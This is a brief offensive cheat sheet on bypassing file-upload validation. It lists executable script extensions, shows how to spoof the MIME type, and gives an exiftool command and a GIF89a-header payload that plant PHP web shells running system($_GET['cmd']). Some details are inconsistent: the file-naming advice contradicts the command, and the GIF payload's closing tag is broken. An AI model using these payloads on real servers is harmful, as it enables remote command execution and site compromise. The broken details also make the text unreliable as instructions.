# File upload bypass

### File Extentions:

- **php:** phtml, .php, .php3, .php4, .php5, and .inc

- **asp:** .asp, .aspx

- **perl:** .pl, .pm, .cgi, .lib

- **jsp:** .jsp, .jspx, .jsw, .jsv, and .jspf

- **Coldfusion:** .cfm, .cfml, .cfc, .dbm

### MIME type

Blacklisting MIME types is also a method of file upload validation. It may be bypassed by intercepting the POST request on the way to the server and modifying the MIME type.

**Normal php MIME type:**

`Content-type: application/x-php`

**Replace with:**

`Content-type: image/jpeg`

### PHP getimagesize()

For file uploads which validate image size using php getimagesize(), it may be possible to execute shellcode by inserting it into the Comment attribute of Image properties and saving it as file.jpg.php.

You can do this with gimp or exiftools:

`exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg`

`mv file.jpg file.php.jpg`

### GIF89a; header

Use to trick the server by modifying the POST request with GIF89a in the header with Burp.

```
GIF89a;
<?
system($_GET['cmd']);
?
```


